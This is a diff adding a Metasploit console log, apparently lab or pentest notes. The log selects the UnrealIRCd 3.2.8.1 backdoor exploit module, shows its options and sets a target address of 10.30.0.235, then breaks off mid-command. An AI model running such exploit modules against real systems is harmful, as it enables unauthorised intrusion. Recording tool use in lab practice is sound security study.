@@ -173,4 +173,34 @@ Matching Modules
 Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/local/zimbra_postfix_priv_esc
 
 msf > 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+use 0
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
 
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: s
+                                       apni, socks4, socks5, http, socks5h
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
+                                       sing-metasploit.html
+   RPORT    6667             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.30.0.235
+RHOSTS => 10.30.0.235
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set 
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
